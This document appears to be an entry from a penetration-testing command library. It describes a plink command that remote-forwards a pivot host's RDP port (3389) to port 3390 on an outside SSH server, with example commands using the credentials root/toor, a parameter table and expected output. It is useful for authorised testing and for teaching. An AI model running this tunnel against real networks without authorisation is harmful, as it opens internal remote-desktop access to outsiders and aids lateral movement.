---
id: 67e07609-f01a-4e55-8540-d45b86b35faa
name: plink-expose-rdp-port-on-ssh-server
type: command
executor: bash
data: 'plink -l root -pw toor -R 3390:127.0.0.1:3389 ssh-server-ip'
output: null
created_at: '2023-04-06T03:56:22.999945+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Linux
tags:
  - network-pivoting
  - ssh-forwarding
  - rdp
verified: true
validated: true
---

# plink-expose-rdp-port-on-ssh-server

## Command

```bash
plink -l $_USERNAME -pw $_PASSWORD -R $_REMOTE_PORT:127.0.0.1:3389 $_SSH_SERVER_IP
```

## Description

Exposes the RDP service (port 3389) on the pivot host to a custom port (e.g., 3390) on the SSH server via remote forwarding. This enables remote desktop access to internal Windows targets through the pivot.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l $_USERNAME | SSH username | Yes |
| -pw $_PASSWORD | SSH password | Yes |
| -R $_REMOTE_PORT:127.0.0.1:3389 | Remote forward: SSH port (e.g., 3390) to pivot's localhost:3389 | Yes |
| $_SSH_SERVER_IP | SSH server IP | Yes |

## Examples

### Basic Usage

```bash
plink -l root -pw toor -R 3390:127.0.0.1:3389 10.0.0.1
```

### Advanced Usage

```bash
plink -l root -pw toor -R 3390:127.0.0.1:3389 -N 10.0.0.1
```
(Non-interactive mode)

## Expected Output

```
Using username "root".
Access granted
Forwarded ports: 127.0.0.1:3389
```
Success: No bind errors; connect via RDP client to ssh-server-ip:3390.

## Related

- [[procedures/Network-Pivoting-with-Plink-Port-Forwarding]]
- [[tools/Plink]]
